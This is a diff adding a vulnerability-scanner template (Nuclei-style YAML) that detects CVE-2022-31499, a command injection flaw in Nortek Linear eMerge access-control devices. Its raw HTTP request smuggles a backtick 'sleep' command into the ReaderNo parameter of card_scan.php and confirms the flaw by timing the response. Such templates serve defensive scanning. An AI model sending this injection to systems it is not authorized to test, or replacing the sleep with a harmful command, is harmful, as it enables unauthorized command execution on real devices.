@@ -1,0 +1,36 @@
+id: CVE-2022-31499
+info:
+  name: Nortek Linear eMerge Command Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: cve, cve2022, command-injection
+  description: |
+    Nortek Linear eMerge devices are vulnerable to a command injection vulnerability, allowing remote attackers to execute arbitrary commands.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+
+http:
+  - raw:
+      - |
+        GET /card_scan.php?No=123&ReaderNo=`sleep%20{{t1}}`&CardFormatNo=123 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"CardNo\":false"
+      - type: word
+        part: header
+        words:
+          - "text/html"
+      - type: dsl
+        dsl:
+          - "!contains(body, '<')"
+          - "duration >= to_number(t1)"
